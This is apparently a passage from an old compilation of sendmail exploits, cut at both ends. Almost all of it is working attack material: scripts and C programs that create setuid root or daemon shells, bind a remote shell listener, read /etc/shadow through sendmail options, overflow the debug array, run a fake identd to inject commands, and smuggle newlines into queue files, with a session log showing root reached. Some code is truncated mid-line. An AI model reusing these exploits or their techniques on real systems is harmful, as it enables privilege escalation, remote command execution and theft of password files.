list when "sploit" was first called.

     #include &lt;sys/param.h>
     #include &lt;sys/types.h>
     #include &lt;stdio.h>
     #include &lt;sysexits.h>
     #include &lt;pwd.h>
     #include &lt;grp.h>

     #define MYUID 777 /* your uid (i.e. your ".forward" invokes this) */

     #definegetuser(uid)getpwuid(uid)->pw_name/* assume valid uid */
     #definegetgrp(gid)getgrgid(gid)->gr_name/* assume valid gid */

     main()
     {
     FILE *fp;
     uid_t myuid;
     int i, rval, ngrps, grplst[NGROUPS];

     if ((myuid = getuid()) == MYUID)
     rval = EX_TEMPFAIL;
     else
     rval = EX_OK;

     if ((fp = fopen("/tmp/whoami", "a")) != NULL) {

     /* real user/group ids */
     fprintf(fp, "%susr:%s grp:%s",
     (rval == EX_OK)? "": "Def> ",
     getuser(myuid), getgrp(getgid()));

     /* effective user/group ids */
     fprintf(fp, " eusr:%s egrp:%s",
     getuser(geteuid()), getgrp(getegid()));

     /* group list */
     if ((ngrps = getgroups(NGROUPS, grplst)) > 0) {
     fprintf(fp, " grps:");
     for (i = 0; i < ngrps; i++)
     fprintf(fp, " %s", getgrp(grplst[i]));
     }
     fprintf(fp, "\n");

     (void) fclose(fp);
     }

     exit(rval);
     }

=====================  trick for sendmail 5.61  ===========================
/*
 * 1) set the #define UID, at the top of the program to be your's
 * 2) create a file: /tmp/.shell, which is a script to make a suid shell
 * 3) compile the program and name it say, /tmp/.magic
 * 4) create a .forward file containing: '|/tmp/.magic'
 * 5) 'telnet yoursystem 25' and send yourself some fakemail from whoever
 *    you want a shell from (but not root :-( RATS!)
 * 6) wait abit, it usually works ...
 */

#define UID 777   /* change to your uid */

#include &lt;sys/param.h>
#include &lt;sys/types.h>
#include &lt;stdio.h>
#include &lt;sysexits.h>
#include &lt;pwd.h>
#include &lt;grp.h>

#define SHELLFILE  "/tmp/.shell"

main()
        int myuid, rval;

        if ((myuid = getuid()) == UID)
                rval = EX_TEMPFAIL;
        else {
                rval = EX_OK;
                system(SHELLFILE);
        }
        exit(rval);
}

Tail creates a daemon shell = TeSTeD oN 5.65 =

Through this sendmail bug, it is possible to become uid daemon (or whatever
your sendmail delivers non-user mail as), or the uid of any user. The
specifics are as follows:

   * The envelope From: field, or possibly the Errors-To: header (but I've
     not tested it), must be set to the pipe through a bounce of your mail
     will be returned. Typically this is executed by uid daemon.

   * An error must be caused in the message such that sendmail will send a
     bounce to the From: envelope (or possibly to Errors-To:).

These two conditions are all that is necessary to exploit the bug.
Typically the simplest thing to pipe to is


        |/usr/ucb/tail|/usr/bin/sh
aka     |/usr/ucb/tail|/bin/sh

That's for SunOS 4.1.3. Other systems may have tail in /usr/bin or /bin/;
the PATH is important in the case.

The condition we have used to generate an error is an invalid
Return-Receipt-To: header. There are a plethora of other ways to do so, and
some of them may depend on the specifics of your sendmail; be forewarned.

The last ten lines of your message should contain whatever you wish to do
as uid daemon.

[panix!jhawk] |% telnet panix.com 25
Trying 198.7.0.2 ...
Connected to panix.com.
Escape character is '^]'.
220 panix.com 5.65c/IDA-1.4.4 Sendmail is ready at Mon, 8 Nov 1993 19:41:13
-0500

HELO
250 Hello panix.com, why do you call yourself ?
MAIL FROM: |/usr/ucb/tail|/usr/bin/sh
250 |/usr/ucb/tail|/usr/bin/sh... Sender ok
RCPT TO: root
250 root... Recipient ok
DATA
354 Enter mail, end with @.@ on a line by itself
 From: jhawk"panix.com (John Hawkinson)
  To: jhawk"panix.com (John Hawkinson)
  Return-Receipt-To: |foobar
  Subject: This is a large hole in the ground.
  X-Disclaimer: We take no responsibility for what might happen

  Hi there. Wanna play ball?

  #!/bin/sh
  #The above line is just in case :-)
  echo This is a Serious Bug > /tmp/bug
  echo id reports: >> /tmp/bug
  /usr/bin/id >> /tmp/bug
  echo Fixing this would be good >> /tmp/bug
  cp /bin/sh /tmp/bugshell
  chmod u+s /tmp/bugshell
  echo /tmp/bugshell contains a setuid daemon shell >> /tmp/bug
  chmod ugo+rx /tmp/bugshell
.
250 Ok
quit
221 panix.com closing connection

"-C" = oLD =

Read any file. Using the '-C' option causes an alternative configuration
file to be used, if the file is a protected file which is actually not a
send mail configuration file, `sendmail' will print out some contents of
the file as an error message.

It is reported working on DYNIX (3.0.14) and ULTRIX (2.X)

$ sendmail -C /etc/shadow	&lt;contents of /etc/shadow>

4.1 = TeSTeD oN 4.1 =

It allows remote access as bin...and since bin owns the /etc dir you can
gain root.

Rsend needs mconnect, which is a binary, which just connects to the place
and sends the data. You can get rid the of ()'s at the beginninga and end
of the script, and get rid of the mconnect line, and run like ./rsend >
file, then ascii U/L the file to port 25...If it says a lot of stuff like
"Command Ununown" 25 times, then it didn't work.

Here's rsend:

#!/bin/sh
# Copyright, 1992, 1993 by Scott Chasin (chasin@crimelab.com)
#
# This material is copyrighted by Scott Chasin, 1992, 1993. The
# usual standard disclaimer applies, especially the fact that the
# author is not liable for any damages caused by direct or indirect
# use of the information or functionality provided by this program.
#
# Description:
#
# Exploit NEW sendmail hole  and bind a port so we can spawn a program.
# Not for distribution under any circumstances
#
# Usage: smail
# default: smail   <7001>

port=$3
user=$2
cmd=$4

if [ -z "$2" ]; then
   user=daemon
fi

if [ -z "$3" ]; then
   port=7002
fi

if [ -z "$4" ]; then
   cmd="/bin/csh -i"
fi

(
sleep 4
echo "helo"
echo "mail from: |"
echo "rcpt to: bounce"
echo "data"
echo "."
sleep 3
echo "mail from: $user"
echo "rcpt to: | sed '1,/^$/d' | sh"
echo "data"
echo "cat > /tmp/a.c <
#include &lt;sys/signal.h>
#include &lt;sys/socket.h>
#include &lt;netinet/in.h>
#include &lt;netdb.h>
reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
int **av;{struct sockaddr_in mya;struct servent *sp
;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
==0){for(x=2;x

Or you can also ul this to port 25.
BTW, it gets you in by running a program that listens to port 7008...
you telnet to port 7008. You can then proceed to create new users in
/etc/passwd because you own the /etc dir...you need to type a ; after every
command, and it gives you 1 error every command...ignore it. The process
may be noticed by a few admins.

helo
mail from: |
rcpt to: bounce
data
.
mail from: bin
rcpt to: | sed '1,/^$/d' | sh
data
cat > /tmp/a.c <
#include &lt;sys/signal.h>
#include &lt;sys/socket.h>
#include &lt;netinet/in.h>
#include &lt;netdb.h>
reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
int **av;{struct sockaddr_in mya;struct servent *sp
;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
==0){for(x=2;x-d

########### = TeSTeD oN SunOS & SunOS with Sendmail8.6.4 =

This bug is present in all 8.X.X sendmail versions prior to 8.6.7 Here
follow excerpts from Michael Widner's message on Bugtraq with his script
for SunOs and Solaris, and another script tested on SunOS 5.2 with sendmail
8.6.4:

"The important thing to know is that if your sendmail crashes when you pass
it something like -d387654321 then it can most likely be exploited to gain
root access.

Without going into much detail, -dx.y writes y into the debug array as
array[x]=y. Range checking is not performed properly on x, so it's possible
to pass negative integers that pass the range check. Find a key location
before the debug array, over write it, and you're in business.

The problem in trying to create a generic script is that the 'key'
locations have different offsets from the debug array for every version of
sendmail. Sometimes they're easy to locate if you can get a core, but
sometimes it is tough to get a core w/o already being root. Also, sometimes
a core tells you nothing.

The following script is Sun specific, and patches are now available for all
versions of Sun sendmail. The script creates a suid root owned copy of
/bin/sh and places it in /tmp. If you're hacking solaris, I'd suggest you
choose some program other than /bin/sh. "

#!/bin/sh
# This script takes advantage of sendmail's (mis)interpretation of
# very large unsigned ints as signed ints when accessing the debug
# array.  As it, it will work with the 8 versions of sun sendmail
# that I have access to.  Perhaps I'll update it if I find new
# versions of sun sendmail.
# NOTE:  This is a Sun specific script.  Don't expect it to work with
#        any non-sun sendmail.
# -Michael R. Widner (atreus)        3/25/94
#
# usage:  smdhole [/path/to/suid/sendmail]
#

# add /usr/ucb to path so solaris can find `whoami` (4/18/94)
path=$path:/usr/ucb

if [ $1x = x ]; then
        sendmail=/usr/lib/sendmail
else
        echo "Trying to abuse $1."
        sendmail=$1
fi

sm_size=`echo \`ls -l $sendmail\` | cut -d" " -f4,5 | sed "s/[^0-9]//g`

# prefix and suffix for -1 as unsigned integer.  Actually, this is
# off by two.  you figure out why.
prefix=42949
suffix=67297

case $sm_size in
        132064)
                n1=${prefix}52864
                n2=${prefix}52865
                n3=${prefix}52866
                echo Patched solaris w/o mx.
                ;;
        134752) # ug! dropped a 0 before.  fixed 4/18/94
                n1=${prefix}01656
                n2=${prefix}01657
                n3=${prefix}01658
                echo Patched solaris sendmail.mx
                ;;
        130860)
                n1=${prefix}53016
                n2=${prefix}53017
                n3=${prefix}53018
                echo Un-patched solaris w/o mx.
                ;;
        133548) # ug! dropped a 0 before.  fixed 4/18/94
                n1=${prefix}01808
                n2=${prefix}01809
                n3=${prefix}01810
                echo Un-patched solaris sendmail.mx
                ;;
        139264)
                n1=${prefix}49609
                n2=${prefix}49610
                n3=${prefix}49611
                echo Sun 4.1.3 sendmail - could be either of two versions
                n4=${prefix}49265
                n5=${prefix}49266
                n6=${prefix}49267
                ;;
        155648)
                n1=${prefix}46953
                n2=${prefix}46954
                n3=${prefix}46955
                echo Sun 4.1.3 sendmail.mx - could be either of two versions
                n4=${prefix}46609
                n5=${prefix}46610
                n6=${prefix}46611
                ;;
        *)
                echo "I don't know what version of sendmail $sendmail is."
                echo -n "Look for other versions of sendmail[.mx] on the "
                echo "system and re-run this as:"
                echo "     $0 /path/to/another/suid/sendmail"
                echo
                echo "Let me see if I can suggest anything..."
                find /usr/lib /var/sadm/patch -name "*sendm*" -perm -4001
-ls 2>/dev/null
                exit 1
                ;;
        esac

cat << EOM > /tmp/sendmail.cf
DMether
DRlocalhost
CRlocalhost
CDMailer-Daemon root daemon uucp
DlFrom \$g  \$d
Do.:%@!^=/[]
Dq\$g\$?x (\$x)\$.
De\$j nothing
OA./aliases
OF0666
Og1
OL0
Oo
OPPostmaster
OQ.
Os
Ou1
T root daemon uucp

H?F?From: nobody

Mlocal, P=/tmp/in.telnet, F=flsSDFMmnP, S=10, R=20, A=mail -d \$u
Mprog,  P=/tmp/in.telnet,   F=lsDFMeuP,  S=10, R=20, A=sh -c \$u

S0
R\$+                    \$#local \$:\$1                 just rewrite
EOM

cat $0 | sed "s:atreus::" | uudecode
uncompress /tmp/in.telnet.Z
chmod 755 /tmp/in.telnet

mkdir /tmp/mail
cp /tmp/sendmail.cf /tmp/mail

cp /bin/sh /tmp/newsh
chmod 666 /tmp/newsh

$sendmail -d${n1}.116,${n2}.109,${n3}.112 `whoami`  &lt;Q2RA)! %(atreus
M5$,).9]$%38!E!= H,(LP$LV*KJ*8(15)".N(AI2!6Q*(@ HPM6U6<4A@716atreus
M+H@"%QQ:D@!. ":U%L;2T'36E%H$D 0 H"!ML><#H0N.!B?A-(#4!5>PGGT9atreus
M068Z7==^%;%A[ BS!U6]5@P*#4V;. $L*)YY,P%@$LP"B' [-X#=O=56&'N!atreus
M]4'J<$(""V!.*1]U2@&Q4TJHY5J8,@FC%"+^00 3&, (" HC_B$@" 1@D*$@atreus
M))R!$, GQ!0$'1^!' ,. H&@4;"CP$@ EIKMFFatreus
MG%-6>24;66X)0AMAP %'&FZ< 8(98:3!1AURE)'G0A3TR::;<'H)IIADXKG0atreus
M"W2T <<+;I1QQQQH%#35+Y",%40(+OET@!X5 @ )!2)  AT MN;AF:Z\Q@K atreus
M 7F8E4([MJZ1:X<?AOC0JY DAY( ((!3UR__$-: )!)D"XT 8%!FEXLY)3"Latreus
M)>02\*LD[8X+Q )U'20!M_U\!$H DDB24W8*6"M*N."$H@(8 D!#P'B?P&03atreus
M0J 0\@,_,N"K\'C0@BBB5%15>Y(TV')3%QCH I  *.%R  0BI51#1!36 $ 4(1>7X0Y$5)%M!!R"TL$L(50[ atreus
MI8N8&A"-4WJ:/7H#?P%H]060%G&Z00P!DP-, 8NA9 D\&B*,Gatreus
M"Y$-X$=!(M1=D R9%R"'4$06M$/F!^0@E$)%? ^*GDO@R0% IQ I") %>LI"atreus
M9 A@BH*,@!0("0-/B**G-)"/#GJ20^9,(Q1H((00HSM ')Z'D$F,3@#3$ HXatreus
M$"**R!@@#P[$ D)JX<)$L&^%!4%&_/X'+&1\H0QT* ,>,/A#,H2!#F$ P _=atreus
M0 8 S &):G(B%.GP!3.PX0U'5.(/\9 &(B**44HL@QOLD(8RN4&+1,B"$X+0atreus
MA"0,(8Q<).(8T-"&-S3Q"W-\PQW.^(4^?I&/X88M=U*(0N_@%atreus
M,M2A#6W(0R/+,(:L]?$+0Z#"$Z3P!28D80I4Z*,6OT $37+2DZ 4Y27)\(8Oatreus
MG.&*8@@#&_!(AS?(80ZC9*4K82G+1M;REHJ,8R,?&1"=*T8I:]*(8S:A&-\K1CGKTHR -J4A'2M*2FO2D*$VI2E?*TI:Z]*4Patreus
MC:E,9TK3FMKTICC-J4YWRM.>^O2G0 VJ4(=*U*(:]:A(3:I2E\K4ICKUJ5"-atreus
MJE2G2M6J6O6J6,VJ5K?*U:YZ]:M@#:M8QTK6LIKUK&A-JUK7RM:VNO6M<(VKatreus
M7.=*U[K:]:YXS>M2_0,$UP&+!"'V!BPN"(5D !B !W4"6)U0;R&5*P Ratreus
M$()#[@$ L3XQ7"" 0;*HO H43OL'/SQ+%= ^+1]!"YT(VN=*=+atreus
MW>I:][K8S:YVM\O=[GKWN^ -KWC'2][RFO>\Z$VO>M?+WO:Z][WPC:]\YTO?atreus
+^MKWOOC-KW[WFUS=atreus
 atreus
endatreus

Here it is the other script:

/* What follows is a sample run exercising the latest sendmail hole and the
script used to exploit this hole. This is a re-send; I neglected to escape
the "." in the sendmail script, leaving the program slightly truncated. To
fix this, I have escaped the . so prior to executing this you must remove
the \. (does that make any sense? :-) There was also a small problem with
nested quotes pointed out by Peter Wemm which I have fixed.

This is the "small version" of the script; it assumes you have a sane
sendmail.cf. In this manner, it is not a particularly robust "breakin
script" but I believe it does illustrate how to exploit the bug.

This program uses "calc.c," the program mentioned by Timothy Newsham in an
earlier message. The program has been modified slightly so that it gives
better results (it would occasionally fail to locate the offset of a config
given a buggy sendmail. The fix is to force a sync() after it generates a
coredump.) The remainder of the program was written by myself and a fellow
student, Steven Dake.

We have held off on releasing this script until we were able to notify the
people responsible for system security at NAU. Locals subscribing to this
digest beware; sendmail on our machines has been patched! :-) */

Script started on Thu Mar 24 00:54:54 1994
[pine] [1] date
Thu Mar 24 00:54:57 MST 1994
[pine] [2] whoami
jwa
[pine] [3] id
uid=4473(jwa) gid=400(student)
[pine] [4] ls -l sendbug.sh
-rwx------   1 jwa      student     4893 Mar 24 00:46 sendbug.sh*
[pine] [5] sendbug.sh
Creating setid0 ...
Creating calc...
Scanning core image for /nau/local/lib/mail/sendmail.cf...
Creating alias.sh ...
Creating fake alias file...
Faking alias pointer in new config file...
Creating the sendmail script...
Executing /usr/lib/sendmail -
d4294935548.47,4294935549.116,4294935550.109,4294935551.112,4294935552.47,4294935553.115,429
4935554.109,4294935555.46,4294935556.9
Version 8.6.4
220-pine.cse.nau.edu Sendmail 8.6.4/WHOOP-v1.0 ready at Thu, 24 Mar 1994
00:55:21 -0700
220 ESMTP spoken here
250 pine.cse.nau.edu Hello jwa@localhost, pleased to meet you
250 ... Sender ok
250 ... Recipient ok
354 Enter mail, end with "." on a line by itself
250 AAA01803 Message accepted for delivery
503 Need MAIL before RCPT
503 Need MAIL command
500 Command unrecognized
500 Command unrecognized
221 pine.cse.nau.edu closing connection
setid0 is a suid shell.  executing...
executing /bin/csh...
pine# whoami
root
pine# id
uid=0(root) gid=0(root)
pine# exit
pine# end of script.

. and here's the program.

#!/bin/sh
# exploit new sendmail bug to give us a root shell
# 24 mar 94  jwa/scd @nau.edu
# "short version"
# tested on sunos 5.2/sendmail 8.6.4

# location of sendmail
SENDMAIL=/usr/lib/sendmail

# location of original sendmail.cf file
CONFIG=/nau/local/lib/mail/sendmail.cf
#CONFIG=`strings $SENDMAIL | grep sendmail.cf`

# program to execute as root
SHELL=/bin/csh

TEMPDIR=/tmp/sendbug-tmp.$$
mkdir $TEMPDIR
chmod 700 $TEMPDIR
cd $TEMPDIR

cp $SENDMAIL sm
chmod 700 sm

echo "Creating setid0 ..."
cat > setid.c << _EOF_

/* set uid to zero, thus escaping the annoying csh and solaris sh
 * problem..
 *
 * if (getuid() != geteuid()) {
 *  printf("permission denied, you root-hacker you.\n");
 *  exit(1);
 * }
 *
 * .. must be run euid 0, obviously.  with no args it runs /bin/sh,
 * otherwise it runs the 1st arg.
 */

#include &lt;stdio.h>

main(argc, argv)
int argc;
char *argv[];

 int uid;

 setuid(0);
 setgid(0);
 seteuid(0);  /* probabally redundant. */
 setegid(0);

 uid = getuid();

 if (uid != 0) {
  printf("setuid(0); failed!  aborting..\n");
  exit(1);
 }

 if (argc !=2) {
  printf("executing /bin/sh...\n");
  system("/bin/sh");
 }
  else
 {
  printf("executing %s...\n", argv[1]);
  system(argv[1]);
 }

_EOF_

cc -o setid0 setid.c

echo "Creating calc..."

cat > calc.c << _EOF_
/*
 * Determines offset in sendmail of
 * sendmail.cf file location.
 * author: timothy newsham
 */
#include &lt;fcntl.h>

gencore()

  int pid;
  int fd[2];

  if(pipe(fd) < 0) {
    perror("pipe");
    exit(1);
    return(0);
  }
  pid = fork();
  if(!pid) {
    int f = open("./out", O_RDWR|O_CREAT, 0666);
    dup2(f, 1); dup2(fd[0], 0);
    close(f); close(fd[1]); close(fd[0]);
    execl("./sm","sm","-d0-9.90","-oQ.","-bs", 0);
    perror("exec");
    exit(0);
  } else {
    sleep(2);
    kill(pid, 11);
  }
  close(fd[0]);
  close(fd[1]);

main(argc,argv)
char **argv;
int argc;

  unsigned int ConfFile,tTdvect,off;

  gencore();
  sync();   /* grr. */
  tTdvect = find("ZZZZZZZZ", "core");
  ConfFile = find(argv[1], "core");
  if(!tTdvect || !ConfFile) {
   return(1);
  }
  off = ConfFile - tTdvect;


printf("-d%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.0\n",  
  off, '/', off+1, 't', off+2, 'm', off+3, 'p', off+4, '/', off+5, 's', \
  off+6, 'm', off+7, '.', off+8, 'c', off+9, 'f', off+10);

int find(pattern, file)
char *pattern,*file;

  int fd;
  int i, addr;
  char c;

  fd = open(file, 0);

  i = 0;
  addr = 0;
  while(read(fd, &c, 1) == 1) {
    if(pattern[i] == c)
      i++;
    else
      i=0;
    if(pattern[i] == '\0') {
      addr -= strlen(pattern);
      return(addr);
    }
    addr++;
  }
  return(0);

_EOF_
cc calc.c -o calc

echo "Scanning core image for $CONFIG..."

DEBUGFLAGS=`calc $CONFIG`

echo "Creating alias.sh ..."
echo "#!/bin/sh
# this program will be executed when mail is sent to the fake alias.
# since solaris sh and csh and tcsh refuse to run when euid != realuid,
# we instead run the program we compiled above.

/bin/chmod 6777 $TEMPDIR/setid0
/bin/chown root $TEMPDIR/setid0
/bin/sync

" > alias.sh

chmod 755 alias.sh

echo "Creating fake alias file..."
echo "yash: |$TEMPDIR/alias.sh" > aliases

echo "Faking alias pointer in new config file..."
egrep -v '(OA|DZ|Ou|Og)' $CONFIG > /tmp/sm.cf
echo "
# hacks follow

OA/$TEMPDIR/aliases                     # our fake alias file
Ou0                                     # user ID to run as
Og0                                     # group ID to run as
DZWHOOP-v1.0" >> /tmp/sm.cf

echo "Creating the sendmail script..."

cat > sendmail.script << _EOF_
helo
mail from: &lt;nobody>
rcpt to: &lt;yash>
data
yet another sendmail hole?  suid whoop?
\.                                      # oops.. delete \ prior to execution
quit
_EOF_

echo "Executing $SENDMAIL $DEBUGFLAGS -bs..."

$SENDMAIL $DEBUGFLAGS -bs < sendmail.script

# give it time to execute.
sleep 4

# cleanup in 5 seconds
(sleep 5; rm -rf $TEMPDIR ; rm /tmp/sm.cf) &

if [ -u setid0 ]
then
 echo "setid0 is a suid shell.  executing..."
 cd /
 $TEMPDIR/setid0 /bin/csh
 echo "end of script."
 exit 0
else
 echo "setid0 is not suid; script failed."
 echo "apparently, you don't have the bug.  celebrate :-)"
 exit 1
fi

-oE/filename bounce = 8.6.7 =

Version affected: 8.6.7

A bug in Sendmail 8.6.7 allows anyone to read any file, including the
shadowed password file:

/usr/lib/sendmail -oE/etc/shadow bounce
From: your_username

8.6.9 = 8.6.9 or earlier =

Mail any file to yourself.

# This is a shell archive.  Save it in a file, remove anything before
# this line, and then unpack it by entering "sh file".  Note, it may
# create directories; files and directories will be owned by you and
# have default permissions.
#
# This archive contains:
#
#       description
#       sm869.local
#       sm869.remote
#
echo x - description
sed 's/^X//' >description << 'END-of-description'
X
XProgram: sm869.remote
X
Xyou can:
X
X   run the body of the mail through a shell if
X   sendmail is allowed to run a shell.
X
X   write the whole message to a file.
X
X   have it send back a file to an account you specify.
X
XThe last option is supposed to remove the file after sending
Xit but I found that it hasn't in my tests.  Why?  Well
Xit has multiple recipients, one of the recipients is a
Xrecipient that will never go through.  So the data file
Xgets kept around until it gives up on that host.  This
Xcan be several days.
X
XProblems:
X
X  The action you specify will happen every 30minutes (the
X  queue time, may be different) until it gives up sending
X  to the unreachable host.  (Actually this may be false.
X  I haven't left it around long enough to see if this happens.
X  Perhaps sendmail is smart enough to remove the other recipients
X  that did get delievered from the queue file).
X
X  If you send a file back to yourself it may get removed
X  several days later.  If you get the password file or
X  some other critical file you had better be ready to clean
X  up.
X
X  Lots of logs.  Its fairly obvious from the log files that
X  some hokey pokey is going on.  If you're sending a file
X  back to yourself then you're pointing a finger at one
X  of your accounts
X
XYou have to go into the program to change the options you
Xwant.  The code is fairly well commented so this shouldn't
Xbe any problem.
X
XProgram: sm869.local
X
XSame thing as above really except it works even if sendmail
Xdoesnt check identd and you dont have to specify an unreachable
Xhost.  The file goes straight to the queue.
X
END-of-description
echo x - sm869.local
sed 's/^X//' >sm869.local << 'END-of-sm869.local'
X#!/bin/sh
X#
X# Exploit hole in sendmail 8.6.9 and earlier.
X#
X
X# Either write a file or run a program.
X#ACTION="|/tmp/runme"
XACTION="/tmp/writeme"
X
X# Data file to read from and then remove
XDATAFILE="/tmp/abc"
X#DATAFILE=""
X
X# Who to run as
XRUNAS="bin"
X
X# Who to send mail to
XWHOAMI=`whoami`
XSENDTO=$WHOAMI
X#SENDTO="someone-else"
X
X# Build up arg and send it off
Xif [ -n "$DATAFILE" ] ; then
XARG="$WHOAMI
XD$DATAFILE
XC:$RUNAS
XR\"$ACTION\""
Xelse
XARG="$WHOAMI
XC:$RUNAS
XR\"$ACTION\""
Xfi
Xsendmail -odq -F"$ARG" $SENDTO << _END_
XThis is appearing in the mailbox
Xand also being piped to the program or
Xwritten to the file, UNLESS you specify
Xa datafile above.  In that case the datafile
Xwill be written and erased and this text will
Xbe left (not deleted) in the queue directory.
X_END_
X
END-of-sm869.local
echo x - sm869.remote
sed 's/^X//' >sm869.remote << 'END-of-sm869.remote'
X#!/bin/sh
X#
X# exploit for sm869 or worse
X# identd must not be enabled (port 113 must be free)
X
X# this must be a host that mail can go to (MX not pointing elsewhere)
X# that we cant reach right now (ie. host doesnt exist anymore)
XUNREACHABLE="goofy.uhcc.hawaii.edu"
X
X# Commands to run on remote host
XCOMMANDS="touch /tmp/gotcha"
X
X# what host to run it on
XTARGET="localhost"
X
X# work in a temp dir
XTD=/tmp/.Xwork.$$
Xmkdir $TD
Xcd $TD
X
Xcat > a.c <<_END_
X#include &lt;sys/types.h>
X#include &lt;sys/socket.h>
X#include &lt;netinet/in.h>
X
X/* run body of mail through shell run as daemon */
X#define REPLY "USERID : UNIX : a\nC:daemon\nR\"|sed
'1,/^$/d'|/bin/sh\"\nHXxx:
"
X
X#ifdef other_possibilities
X/* write to a file as daemon */
X#define REPLY "USERID : UNIX : a\nC:daemon\nR/tmp/writeme\nHXxx: "
X/* send back a file to someone and erase it */
X#define REPLY "USERID : UNIX :
a\nD/tmp/sendtome\nRmy@address.here\nHXxx: "
X#endif
X
Xreadline(fd, buf, len)
Xchar *buf;
X{
X    int i = 0;
X
X    while(i < len && read(fd, &buf[i], 1) == 1 && buf[i]) {
X       if(buf[i] == '\r' || buf[i] == '\n')
X           break;
X       i++;
X    }
X    buf[i] = '\0';
X}
X
Xdie(str)
Xchar *str;
X{
X    perror(str); exit(1);
X}
X
Xmain()
X{
X    int s, s2, adlen;
X    struct sockaddr_in ad;
X    char buf[60];
X
X    ad.sin_family = AF_INET;
X    ad.sin_port = htons(113);
X    ad.sin_addr.s_addr = INADDR_ANY;
X    if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) die("socket");
X    if(bind(s, (struct sockaddr *)&ad, sizeof(ad)) == -1) die("bind");
X    if(listen(s, 1) == -1) die("listen");
X    adlen = sizeof(ad);
X    s2 = accept(s, (struct sockaddr *)&ad, &adlen);
X    if(s2 == -1) die("accept");
X    printf("Connection from %s port %d\n",
X        inet_ntoa(ad.sin_addr), ntohs(ad.sin_port));
X    readline(s2, buf, 50);
X    sprintf(buf + strlen(buf), " : %s\n", REPLY);
X    write(s2, buf, strlen(buf));
X}
X_END_
X
X# compile program
Xecho "compiling"
Xcc a.c -o ident
Xecho "running fake ident"
X./ident &
X
X# send to reomte
Xecho "talking to remote"
X(
X  sleep 1; echo "helo"
X  sleep 1; echo "mail from: "
X  sleep 1; echo "rcpt to: "
X  sleep 1; echo "data"
X  echo "$COMMANDS"
X  echo "."
X  sleep 1; echo "quit"
X  sleep 5
X) | telnet $TARGET 25
X
X# cleanup
Xcd /
Xrm -rf $TD
Xecho "done."
X
END-of-sm869.remote
exit

8.6.9 newlines = 8.6.9 =

When a message is queued for delivery by sendmail, a pair of files are
written to the spool directory (/var/spool/mqueue on many systems). One of
these files (qf&lt;something>) contains information related to the processing
of the message (headers, sender, recipient, etc.). Taking versions of
sendmail prior to 8.6.10 as an example, one of the pieces of information
maintained in this file is the name of the controlling user if mail is
being delivered to a script (or file). By feeding sendmail a recipient
address that contains newlines, it is possible to add lines to the queue
file which specify a controlling user and an executable to run with that
users access level. The 8.6.10 patch removes this hole, by stripping
newlines from the recipient address before writing the queue file.

EXPLOIT:

/* smh.c - atreus (2/27/95)
 *
 * a quick hack to abuse sendmail 8.6.9 or whatever else is subject to this
 * hole.  It's really just a matter of passing newlines in arguments to
 * sendmail and getting the stuff into the queue files.  If we run this
 * locally with -odq we are guaranteed that it will be queue, rather than
 * processed immediately.  Wait for the queue to get processed automatically
 * or just run sendmail -q if you're impatient.

 * usage: smh [ username [/path/to/sendmail]]

 * It's worth noting that this is generally only good for getting bin.
 * sendmail still wants to process the sendmail.cf file, which contains
 * Ou1 and Og1 most of the time, limiting you to bin access.  Is there
 * a way around this?

 * cc -o smh smh.c should do the trick.  This just creates a bin owned
 * mode 6777 copy of /bin/sh in /tmp called /tmp/newsh.  Note that on some
 * systems this is pretty much worthless, but you're smart enough to know
 * which systems those are.  Aren't you?
 */

#include &lt;sys/types.h>
#include &lt;unistd.h>
#include &lt;stdlib.h>

main(argc, argv)
int argc;
char **argv;
{
        execlp(argv[2] ? argv[2] : "sendmail","sendmail","-odq","-p",
        "ascii\nCroot\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\nMlocal,
P=/bin/sh, F=lsDFMeu,
A=sh -c $u\nR<\"|/bin/cp /bin/sh /tmp/newsh\">\nR<\"|/bin/chmod 6777
/tmp/newsh\">\n$rascii ",
        argv[1] ? argv[1] : "atreus",0);
}

8.6.10 ident/newlines = 8.6.10 =

This is a sendmail 8.6.10 attack based on the problems that sendmail 8.6.10
inherited from sendmail 8.6.9 .... Look at comments in the source. Two
exploits follow:

/* 8.6.10 sendmail attacker
 *
 * gcc ident.c -o ident
 * add the following line to your /etc/inetd.conf:
 * ident  stream tcp  nowait  root  /tmp/ident  in.identd
 * then kill -HUP inetd
 *
 * Not for not public use or disclosure.
 *
 * This is a sendmail 8.6.10 attack based on the problems that
 * sendmail 8.6.10 inherited from sendmail 8.6.9 - blindly accepting
 * information given to it by identd, which included bogus characters
 * and newlines that it later appended to the queue file.  Sendmail 8.6.10
 * supposedly "strips" newlines before they are written, however, it
 * converts them to spaces, and the following code demonstrates that
 * quick work-around patches are never ever stable...
 *
 * NOTES:  This hack only works when sendmail queues up the message for
 * later delivery.  This depends on the configuration of sendmail.cf and
 * on the machine loading.  If you can do something to drag the machine to
 * its knees, then fire off this attack, you stand a much better chance of
 * success.
 *
